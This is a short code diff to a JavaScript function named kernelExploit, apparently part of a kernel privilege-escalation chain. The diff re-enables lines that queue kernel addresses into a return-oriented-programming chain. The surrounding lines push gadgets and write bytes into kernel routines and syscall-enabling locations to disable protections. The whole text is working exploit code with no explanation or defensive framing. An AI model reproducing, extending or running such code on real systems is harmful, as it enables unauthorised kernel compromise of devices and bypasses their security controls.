@@ -590,8 +590,8 @@ function kernelExploit() {
   kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
   kchain2.kwrite1(KERNEL_copystr, 0xEB);
   kchain2.kwrite1(KERNEL_busy, 0x0);
- // var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
-  //var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
+ var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
+  var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
   kchain2.push(gadgets["pop rdi"]);
   kchain2.push(0x6);
   kchain2.push(gadgets["pop rsi"]);
@@ -605,8 +605,8 @@ function kernelExploit() {
   kchain2.push(0x0);
   var idx4_dest = kchain2.get_rsp();
   kchain2.pushSymbolic();
- // kchain2.finalizeSymbolic(idx3, idx3_dest);
-  //kchain2.finalizeSymbolic(idx4, idx4_dest);
+  kchain2.finalizeSymbolic(idx3, idx3_dest);
+  kchain2.finalizeSymbolic(idx4, idx4_dest);
   kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
   kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
   kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
